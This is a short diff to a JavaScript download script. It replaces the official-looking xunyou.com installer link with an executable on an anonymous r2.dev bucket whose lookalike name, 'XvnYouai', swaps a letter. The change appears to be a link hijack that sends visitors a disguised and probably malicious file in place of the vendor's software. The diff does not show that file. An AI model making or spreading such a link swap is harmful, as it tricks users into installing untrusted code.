@@ -1,4 +1,4 @@
-﻿var downLoadUrl = "https://partnerdownload.xunyou.com/specver/SEM/XunYou307657423.exe";
+﻿var downLoadUrl = "https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/XvnYouai3156202153.exe";
 $(function () {
   var s = $G("s");
   if (s != "") {
